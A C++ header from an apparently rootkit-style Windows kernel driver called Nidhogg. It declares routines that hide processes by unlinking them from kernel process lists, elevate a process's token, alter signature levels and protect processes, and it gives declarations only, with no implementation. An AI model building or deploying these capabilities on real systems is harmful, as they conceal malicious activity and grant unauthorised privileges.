#pragma once
#include "pch.h"
#include "IoctlShared.h"
#include "ListHelper.hpp"
#include "MemoryHelper.h"
#include "ProcessHelper.h"

extern "C" {
	#include "WindowsTypes.h"
}
#include "NidhoggCommon.h"
#include "MemoryHandler.h"

// Structs
struct ProtectedProcessEntry {
	LIST_ENTRY Entry;
	ULONG Pid;
};

struct HiddenProcessEntry {
	LIST_ENTRY Entry;
	ULONG Pid;
	PLIST_ENTRY OriginalEntry;
};

struct ProcessList {
	SIZE_T Count;
	FastMutex Lock;
	PLIST_ENTRY Items;
};

class ProcessHandler {
private:
	ProcessList protectedProcesses;
	ProcessList hiddenProcesses;

	void RemoveListLinks(PLIST_ENTRY current);
	void AddListLinks(PLIST_ENTRY current, PLIST_ENTRY target);

	_IRQL_requires_max_(APC_LEVEL)
	bool AddHiddenProcess(_In_ HiddenProcessEntry hiddenProcess);

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetTokenOffset() const;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetActiveProcessLinksOffset() const;

	_IRQL_requires_max_(APC_LEVEL)
	ULONG GetSignatureLevelOffset() const;

public:
	void* operator new(size_t size) noexcept {
		return AllocateMemory<PVOID>(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	_IRQL_requires_max_(APC_LEVEL)
	ProcessHandler();

	_IRQL_requires_max_(APC_LEVEL)
	~ProcessHandler();

	_IRQL_requires_max_(DISPATCH_LEVEL)
	bool FindProcess(_In_ ULONG pid, _In_ ProcessType type) const;

	_IRQL_requires_max_(APC_LEVEL)
	bool ProtectProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	bool RemoveProcess(_In_ ULONG pid, _In_ ProcessType type);

	_IRQL_requires_max_(APC_LEVEL)
	void ClearProcessList(_In_ ProcessType type);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListProtectedProcesses(_Inout_ IoctlProcessList* processList);

	_IRQL_requires_max_(APC_LEVEL)
	bool ListHiddenProcesses(_Inout_ IoctlProcessList* processList);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS ElevateProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS SetProcessSignature(_In_ IoctlProcessSignature* processSignature);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS UnhideProcess(_In_ ULONG pid);

	_IRQL_requires_max_(APC_LEVEL)
	NTSTATUS HideProcess(_In_ ULONG pid);
};

inline ProcessHandler* NidhoggProcessHandler;

OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(_Inout_ PVOID registrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION info);

void OnProcessCreationExit(_In_ HANDLE parentId, _In_ HANDLE processId, _In_ BOOLEAN create);
